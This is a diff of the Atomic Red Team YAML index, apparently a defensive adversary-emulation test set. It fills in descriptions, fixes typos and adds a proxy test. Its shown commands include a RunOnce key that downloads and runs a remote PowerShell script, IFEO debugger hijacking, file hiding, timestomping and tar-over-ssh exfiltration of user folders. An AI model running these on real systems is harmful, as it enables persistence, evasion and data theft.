@@ -1125,7 +1125,7 @@ persistence:
           mkdir .hidden-directory
           echo "this file is hidden" > .hidden-directory/.hidden-file
     - name: Mac Hidden file
-      description: 'TODO
+      description: 'Hide a file on MacOS
 
 '
       supported_platforms:
@@ -1158,29 +1158,39 @@ persistence:
 
 '
     - name: Hidden files
-      description: 'Requieres Apple Dev Tools
+      description: 'Requires Apple Dev Tools
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'setfile -a V #{filename}
 
 '
     - name: Hide a Directory
-      description: 'xxx
+      description: 'Hide a directory on MacOS
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'chflags hidden #{filename}
 
 '
     - name: Show all hidden files
-      description: 'xxx
+      description: 'Show all hidden files on MacOS
 
 '
       supported_platforms:
@@ -1190,8 +1200,8 @@ persistence:
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
 '
-    - name: Create visible Directories
-      description: 'xxx
+    - name: Create Visible Directories
+      description: 'Create visible directories on MacOS and Linux
 
 '
       supported_platforms:
@@ -1205,7 +1215,7 @@ persistence:
           ls
           ls visible-directory
     - name: Create hidden directories and files
-      description: 'xxx
+      description: 'Create hidden directories and files on Nix platforms
 
 '
       supported_platforms:
@@ -1550,7 +1560,7 @@ persistence:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -1570,7 +1580,7 @@ persistence:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -1780,7 +1790,7 @@ persistence:
       identifier: T1160
     atomic_tests:
     - name: Launch Daemon
-      description: 'TODO
+      description: 'Utilize LaunchDaemon to launch `Hello World`
 
 '
       supported_platforms:
@@ -1963,7 +1973,7 @@ persistence:
       identifier: T1168
     atomic_tests:
     - name: Cron Job
-      description: 'TODO
+      description: 'Set a cron job
 
 '
       supported_platforms:
@@ -1982,7 +1992,7 @@ persistence:
 
 '
     - name: Cron Job
-      description: 'TODO
+      description: 'Manually set a cron job
 
 '
       supported_platforms:
@@ -2595,7 +2605,7 @@ persistence:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -2839,7 +2849,7 @@ persistence:
         name: powershell
         command: |
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
           Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
     - name: Startup Folder
       description: 'Add Shortcut To Startup via PowerShell
@@ -4238,11 +4248,6 @@ defense-evasion:
         [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
       supported_platforms:
       - windows
-      input_arguments:
-        output_file:
-          description: TODO
-          type: todo
-          default: TODO
       executor:
         name: manual
         steps: |
@@ -4983,7 +4988,7 @@ defense-evasion:
           mkdir .hidden-directory
           echo "this file is hidden" > .hidden-directory/.hidden-file
     - name: Mac Hidden file
-      description: 'TODO
+      description: 'Hide a file on MacOS
 
 '
       supported_platforms:
@@ -5016,29 +5021,39 @@ defense-evasion:
 
 '
     - name: Hidden files
-      description: 'Requieres Apple Dev Tools
+      description: 'Requires Apple Dev Tools
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'setfile -a V #{filename}
 
 '
     - name: Hide a Directory
-      description: 'xxx
+      description: 'Hide a directory on MacOS
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'chflags hidden #{filename}
 
 '
     - name: Show all hidden files
-      description: 'xxx
+      description: 'Show all hidden files on MacOS
 
 '
       supported_platforms:
@@ -5048,8 +5063,8 @@ defense-evasion:
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
 '
-    - name: Create visible Directories
-      description: 'xxx
+    - name: Create Visible Directories
+      description: 'Create visible directories on MacOS and Linux
 
 '
       supported_platforms:
@@ -5063,7 +5078,7 @@ defense-evasion:
           ls
           ls visible-directory
     - name: Create hidden directories and files
-      description: 'xxx
+      description: 'Create hidden directories and files on Nix platforms
 
 '
       supported_platforms:
@@ -5250,7 +5265,7 @@ defense-evasion:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -5270,7 +5285,7 @@ defense-evasion:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -6491,7 +6506,7 @@ defense-evasion:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -7041,17 +7056,6 @@ defense-evasion:
         command: 'sudo modprobe #{rootkit_file}
 
 '
-    - name: LD_PRELOAD based Rootkit
-      description: 'LD_PRELOAD based Rootkit
-
-'
-      supported_platforms:
-      - linux
-      executor:
-        name: sh
-        command: 'export LD_PRELOAD=$PWD/#{rootkit_file}
-
-'
     - name: Windows Signed Driver Rootkit Test
       description: |
         This test exploits a signed driver to execute code in Kernel.
@@ -7446,6 +7450,7 @@ defense-evasion:
         target_filename:
           description: Path of file that we are going to stomp on last access time
           type: Path
+          default: "/opt/filename"
       executor:
         name: sh
         command: 'touch -a -t 197001010000.00 #{target_filename}
@@ -7462,6 +7467,7 @@ defense-evasion:
         target_filename:
           description: Path of file that we are going to stomp on last access time
           type: Path
+          default: "/opt/filename"
       executor:
         name: sh
         command: 'touch -m -t 197001010000.00 #{target_filename}
@@ -7480,6 +7486,7 @@ defense-evasion:
         target_filename:
           description: Path of file that we are going to stomp on last access time
           type: Path
+          default: "/opt/filename"
       executor:
         name: sh
         command: |
@@ -8612,7 +8619,7 @@ privilege-escalation:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -8632,7 +8639,7 @@ privilege-escalation:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -8725,7 +8732,7 @@ privilege-escalation:
       identifier: T1160
     atomic_tests:
     - name: Launch Daemon
-      description: 'TODO
+      description: 'Utilize LaunchDaemon to launch `Hello World`
 
 '
       supported_platforms:
@@ -8926,7 +8933,7 @@ privilege-escalation:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -13321,7 +13328,7 @@ execution:
       identifier: T1168
     atomic_tests:
     - name: Cron Job
-      description: 'TODO
+      description: 'Set a cron job
 
 '
       supported_platforms:
@@ -13340,7 +13347,7 @@ execution:
 
 '
     - name: Cron Job
-      description: 'TODO
+      description: 'Manually set a cron job
 
 '
       supported_platforms:
@@ -15610,8 +15617,8 @@ lateral-movement:
       type: attack-pattern
       identifier: T1105
     atomic_tests:
-    - name: xxxx
-      description: 'xxxx
+    - name: rsync - scp - sftp remote file copy
+      description: 'Utilize rsync, scp and sftp to perform a remote file copy
 
 '
       supported_platforms:
@@ -15620,7 +15627,7 @@ lateral-movement:
       executor:
         name: bash
         command: |
-          ### TODO: Not sure how to handle commands that need to be run on multiple systems
+          ### FIX: Not sure how to handle commands that need to be run on multiple systems
 
           # Adversary System Configuration
           # Ensure SSH access has been configured for an adversary account
@@ -16212,7 +16219,7 @@ collection:
       - windows
       executor:
         name: powershell
-        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.bat'')"
+        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
           > c:\windows\pi.log
 
 '
@@ -16547,9 +16554,8 @@ exfiltration:
       identifier: T1002
     atomic_tests:
     - name: Compress Data for Exfiltration With PowerShell
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -16567,9 +16573,8 @@ exfiltration:
 
 '
     - name: Compress Data for Exfiltration With Rar
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -16587,9 +16592,8 @@ exfiltration:
 
 '
     - name: Data Compressed - nix
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - linux
       - macos
@@ -16667,7 +16671,7 @@ exfiltration:
       identifier: T1022
     atomic_tests:
     - name: Data Encrypted
-      description: 'TODO
+      description: 'Encrypt data for exiltration
 
 '
       supported_platforms:
@@ -16738,11 +16742,6 @@ exfiltration:
       - centos
       - ubuntu
       - linux
-      input_arguments:
-        output_file:
-          description: TODO
-          type: todo
-          default: TODO
       executor:
         name: sh
         command: |
@@ -16833,6 +16832,19 @@ exfiltration:
       - centos
       - ubuntu
       - linux
+      input_arguments:
+        domain:
+          description: target SSH domain
+          type: url
+          default: target.example.com
+        user_name:
+          description: username for domain
+          type: string
+          default: atomic
+        password:
+          description: password for user
+          type: string
+          default: atomic
       executor:
         name: sh
         command: 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh
@@ -16931,6 +16943,89 @@ command-and-control:
       modified: '2018-04-18T17:59:24.739Z'
       type: attack-pattern
     atomic_tests: []
+  T1090:
+    technique:
+      name: Connection Proxy
+      description: |-
+        A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools)
+
+        The definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.
+
+        The network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.
+
+        Detection: Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.
+
+        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+
+        Platforms: Linux, macOS, Windows
+
+        Data Sources: Process use of network, Process monitoring, Netflow/Enclave netflow, Packet capture
+
+        Requires Network: Yes
+
+        Contributors: Walker Johnson
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      external_references:
+      - url: https://attack.mitre.org/wiki/Technique/T1090
+        source_name: mitre-attack
+        external_id: T1090
+      - description: 'Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools
+          of the Trade. Retrieved December 2, 2015.'
+        source_name: Trend Micro APT Attack Tools
+        url: http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/
+      - description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        source_name: University of Birmingham C2
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      created: '2017-05-31T21:31:08.479Z'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      x_mitre_data_sources:
+      - Process use of network
+      - Process monitoring
+      - Netflow/Enclave netflow
+      - Packet capture
+      x_mitre_network_requirements: true
+      x_mitre_contributors:
+      - Walker Johnson
+      id: attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea
+      modified: '2018-04-18T17:59:24.739Z'
+      type: attack-pattern
+      identifier: T1090
+    atomic_tests:
+    - name: Connection Proxy
+      description: |
+        Enable traffic redirection.
+
+        To undo changes made by this test:
+          unset http_proxy
+          unset https_proxy
+
+        Note that this test may conflict with pre-existing system configuration.
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        proxy_server:
+          description: Proxy server URL (host:port)
+          type: url
+          default: 127.0.0.1:8080
+        proxy_scheme:
+          description: Protocol to proxy (http or https)
+          type: string
+          default: http
+      executor:
+        name: sh
+        command: 'export #{proxy_scheme}_proxy=#{proxy_server}
+
+'
   T1132:
     technique:
       name: Data Encoding
@@ -17066,8 +17161,8 @@ command-and-control:
       type: attack-pattern
       identifier: T1105
     atomic_tests:
-    - name: xxxx
-      description: 'xxxx
+    - name: rsync - scp - sftp remote file copy
+      description: 'Utilize rsync, scp and sftp to perform a remote file copy
 
 '
       supported_platforms:
@@ -17076,7 +17171,7 @@ command-and-control:
       executor:
         name: bash
         command: |
-          ### TODO: Not sure how to handle commands that need to be run on multiple systems
+          ### FIX: Not sure how to handle commands that need to be run on multiple systems
 
           # Adversary System Configuration
           # Ensure SSH access has been configured for an adversary account
